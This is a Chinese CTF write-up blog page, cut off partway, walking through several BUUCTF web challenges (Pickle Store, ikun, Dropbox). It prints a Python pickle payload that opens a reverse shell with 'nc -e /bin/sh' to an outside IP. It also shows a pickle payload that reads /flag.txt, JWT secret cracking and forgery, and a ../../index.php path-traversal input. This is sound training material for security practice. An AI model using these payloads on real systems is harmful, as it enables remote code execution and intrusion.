@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="[watevrCTF-2019]Pickle Store	[CISCN2019 华北赛区 Day1 Web2]ikun	[CISCN2019 华北赛区 Day1 Web1]Dropbox	[RoarCTF 2019]Simple Upload">
+<meta property="og:type" content="website">
+<meta property="og:title" content="buuctf的部分解题">
+<meta property="og:url" content="http://example.com/exp/question%20twenty-seven.html">
+<meta property="og:site_name" content="Once">
+<meta property="og:description" content="[watevrCTF-2019]Pickle Store	[CISCN2019 华北赛区 Day1 Web2]ikun	[CISCN2019 华北赛区 Day1 Web1]Dropbox	[RoarCTF 2019]Simple Upload">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230317220938029.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318092211903.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318104708498.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318105101359.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318105122834.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318143507801.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318143535545.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318151634127.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318151808828.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318151851452.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318151924053.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318152016979.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318152036218.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318152154717.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318152248042.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318152325590.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318152359325.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318152450293.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318153330086.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318153358108.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230318153435954.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230319212630117.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230319212651960.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230319212754888.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230319212844076.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230319213229475.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230320203700097.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230320204901597.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230320210523503.png">
+<meta property="og:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230320210741776.png">
+<meta property="article:published_time" content="2023-09-16T12:16:42.619Z">
+<meta property="article:modified_time" content="2023-03-21T11:16:06.901Z">
+<meta property="article:author" content="Once">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/exp/question%20twenty-seven.htm/image-20230317220938029.png">
+
+<link rel="canonical" href="http://example.com/exp/question%20twenty-seven">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>buuctf的部分解题 | Once
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Once</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">26</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">buuctf的部分解题
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <p>[watevrCTF-2019]Pickle Store	[CISCN2019 华北赛区 Day1 Web2]ikun	[CISCN2019 华北赛区 Day1 Web1]Dropbox	[RoarCTF 2019]Simple Upload</p>
+<span id="more"></span>
+
+<h3 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h3><p>1.打开显示</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230317220938029.png" alt="image-20230317220938029"></p>
+<p>看到可以购买flag但是钱不够</p>
+<p>看一下cookie</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318092211903.png" alt="image-20230318092211903"></p>
+<p>将session进行base64解码，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ýq(XmoneyqM䁘historyq]qXanti_tamper_hmacqX aa1ba4de55048cf20e0a7a63b7f8eb62qu.</span><br></pre></td></tr></table></figure>
+
+<p>看到有一堆乱码</p>
+<p>2.这里是Pickle反序列化，先看两个函数</p>
+<p><strong>pickle.dumps(obj)：</strong><br>把 obj 对象<strong>序列化</strong>后以 bytes 对象返回，不写入文件</p>
+<p><strong>pickle.loads(bytes_object)：</strong><br>从 bytes 对象中读取一个反序列化对象，并返回其重组后的对象</p>
+<p>将cookid反序列化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(b64decode(enc)))</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">&#123;<span class="string">&#x27;money&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;history&#x27;</span>: [], <span class="string">&#x27;anti_tamper_hmac&#x27;</span>: <span class="string">&#x27;aa1ba4de55048cf20e0a7a63b7f8eb62&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>确实可以看到钱的数量</p>
+<p>3.getshell构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;nc -e /bin/sh 8.130.111.249 9999&#x27;)&quot;,))</span><br><span class="line">a = A()</span><br><span class="line">print( base64.b64encode( pickle.dumps(a) ) )</span><br><span class="line">#gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw7X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIC1lIC9iaW4vc2ggOC4xMzAuMTExLjI0OSA5OTk5JymUhZRSlC4=</span><br></pre></td></tr></table></figure>
+
+<h5 id="reduce-方法"><a href="#reduce-方法" class="headerlink" title="__reduce__方法"></a><code>__reduce__方法</code></h5><p>这个方法用来表明类的对象应当如何序列化</p>
+<p>该方法的返回值是tuple类型时就可以实现任意代码执行</p>
+<p>例如执行以下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        cmd = &quot;whoami&quot;  #命令</span><br><span class="line">        return (os.system,(cmd,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">pickle_a = pickle.dumps(a)#序列化</span><br><span class="line">print(pickle_a)</span><br><span class="line">pickle.loads(pickle_a) #反序列化时触发了代码执行</span><br></pre></td></tr></table></figure>
+
+<p>返回</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318104708498.png" alt="image-20230318104708498"></p>
+<p>确实执行了自己写入的命令</p>
+<p>3.先在自己的服务器上开启一个监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>
+
+<p>然后在网页上修改cookie值将以前的修改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw7X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIC1lIC9iaW4vc2ggOC4xMzAuMTExLjI0OSA5OTk5JymUhZRSlC4=</span><br></pre></td></tr></table></figure>
+
+<p>再点击购买flag，查看服务器监听</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318105101359.png" alt="image-20230318105101359"></p>
+<p>连接成功，使用命令ls</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318105122834.png" alt="image-20230318105122834"></p>
+<p>再使用命令cat flag.txt得到flag</p>
+<h3 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h3><p>1.打开显示</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318143507801.png" alt="image-20230318143507801"></p>
+<p>先注册一个号登录上去</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318143535545.png" alt="image-20230318143535545"></p>
+<p>这是一个线索，需要购买到lv6，但是在这其中并没有lv6，点击下一页也没有</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318151634127.png" alt="image-20230318151634127"></p>
+<p>看wp是用python来找到是181页</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318151808828.png" alt="image-20230318151808828"></p>
+<p>抓包结算</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318151851452.png" alt="image-20230318151851452"></p>
+<p>修改折扣力度</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318151924053.png" alt="image-20230318151924053"></p>
+<p>看到有回显<code>Location: /b1g_m4mber</code>，打开此页面</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318152016979.png" alt="image-20230318152016979"></p>
+<p>看cookie</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318152036218.png" alt="image-20230318152036218"></p>
+<p>有jwt，将<a target="_blank" rel="noopener" href="https://jwt.io/">jwt解码</a>显示</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318152154717.png" alt="image-20230318152154717"></p>
+<p>需要构造username是admin，但是还需要密钥，使用jwt-cracker工具去爆破密钥</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318152248042.png" alt="image-20230318152248042"></p>
+<p>得到密钥是1Kun</p>
+<p>这样可以构造jwt</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318152325590.png" alt="image-20230318152325590"></p>
+<p>修改之前的jwt后刷新显示</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318152359325.png" alt="image-20230318152359325"></p>
+<p>点击一件成为大会员并没有什么用，查看该页面的网页源代码，看到有</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318152450293.png" alt="image-20230318152450293"></p>
+<p>将这个zip文件下载下来</p>
+<p>有一个Admin.php文件，内容是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其中有一个become参数，<code>pickle.loads()</code>可以将<code>become</code>参数进行反序列化，这样可以使用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
+
+<p>需要在python2环境下运行得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318153330086.png" alt="image-20230318153330086"></p>
+<p>抓取点击一件成为大会员时</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318153358108.png" alt="image-20230318153358108"></p>
+<p>将become的内容改为脚本获得的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/exp/question%20twenty-seven.htm/image-20230318153435954.png" alt="image-20230318153435954"></p>
+<p>最后获得flag</p>
+<h3 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p>1.打开显示</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230319212630117.png" alt="image-20230319212630117"></p>
+<p>先注册并登录</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230319212651960.png" alt="image-20230319212651960"></p>
+<p>可以上传文件，先上传一个php文件，显示不能上传</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230319212754888.png" alt="image-20230319212754888"></p>
+<p>只能上传图片类型的文件</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230319212844076.png" alt="image-20230319212844076"></p>
+<p>上传完成后发现还可以下载和删除，抓取下载页面</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230319213229475.png" alt="image-20230319213229475"></p>
+<p>可以修改filename的值来获取源代码</p>
+<p>将filename等于..&#x2F;..&#x2F;index.php</p>
+<p>获得</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;缃戠洏绠＄悊&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/panel.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">&quot;breadcrumb&quot;</span>&gt;</span><br><span class="line">    &lt;ol <span class="class"><span class="keyword">class</span>=&quot;<span class="title">breadcrumb</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;绠＄悊闈㈡澘&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">fileLabel</span>&quot;&gt;涓婁紶鏂囦欢&lt;/<span class="title">label</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span> <span class="title">ml</span>-<span class="title">auto</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;浣犲ソ &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SESSION</span>[&#x27;<span class="title">username</span>&#x27;]?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ol</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>&quot; <span class="title">id</span>=&quot;<span class="title">toast</span>-<span class="title">container</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> &quot;<span class="title">class</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">a</span> = <span class="title">new</span> <span class="title">FileList</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">sandbox</span>&#x27;]);</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Name</span>();</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Size</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">download.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span 